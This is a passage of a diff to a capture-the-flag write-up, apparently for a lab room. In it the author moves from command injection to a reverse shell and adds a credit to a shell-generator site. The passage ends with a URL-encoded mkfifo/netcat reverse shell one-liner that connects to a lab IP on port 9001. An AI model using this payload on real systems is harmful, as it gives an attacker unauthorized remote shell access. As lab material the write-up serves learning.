@@ -318,7 +318,7 @@ After checking the log again along with the `id` command, we can see that we've 
 
 From here, you can either list the contents of the `/var/www/html/` directory from Burp repeater, or you can try to get a reverse shell and browse around a bit easier. The first time I did this room, I did it entirely in Burp, but for the purpose of this writeup, I'll test the reverse shell method.
 
-Using the following URL-encoded command I was able to get a reverse shell
+Using the following URL-encoded command I was able to get a reverse shell. I used [revshells.com](https://revshells.com) to generate this.
 
 ```
 rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.2.113.252%209001%20%3E%2Ftmp%2Ff
